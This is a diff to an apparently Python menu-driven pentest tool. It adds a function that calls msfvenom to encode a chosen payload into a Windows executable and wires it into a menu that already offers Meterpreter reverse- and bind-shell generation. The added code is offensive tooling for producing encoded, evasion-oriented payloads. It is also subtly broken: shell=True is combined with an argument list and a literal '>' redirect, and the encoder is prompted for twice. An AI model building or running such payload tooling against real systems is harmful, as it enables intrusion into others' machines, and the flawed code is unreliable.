@@ -54,7 +54,23 @@ def passwdAttacks():
             main()
         else:
             print('Invalid option.')
-    
+
+def payload_encode():
+    payload=input('Enter the name of the payload you would like to encode: ')
+    encoder=input("Enter the encoder you would like to use (type 'options' to see payload options): ")
+    if encoder=='options':
+        try:
+            subprocess.run(['msfvenom','-l','encoders'],text=True,shell=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    encoder=input('Enter the encoder you would like to use: ')
+    print('''
+    msfvenom -p {} -e {} -f exe > encoded_payload.exe
+    '''.format(payload,encoder))
+    try:
+        subprocess.run(['msfvenom','-p',payload,'-e',encoder,'-f','exe','>','encoded_payload.exe'],text=True,shell=True)
+    except subprocess.SubprocessError as error:
+        print('Encountered an error: ',str(error))
 def custom_payload():
     payload_type=input('Enter the type of payload you would like to generate: ')
     payload_format=input('Enter the format of the payload you would like to generate: ')
@@ -142,7 +158,8 @@ def payload():
         print('''
 [1] Generate a reverse shell payload (Meterpreter)
 [2] Generate a bind shell payload (Meterpreter)
-[3] Generate a custom payload
+[3] Generate a custom payload with Msfvenom
+[4] Encode a payload with Msfvenom
 [BACK] Back to main menu             
           
 ''')
@@ -171,6 +188,8 @@ def payload():
             custom_payload()
         elif payloadOption=='BACK':
             main()
+        elif payloadOption=='4':
+            payload_encode()
         else:
             print('Invalid option.')
 def postgresql():
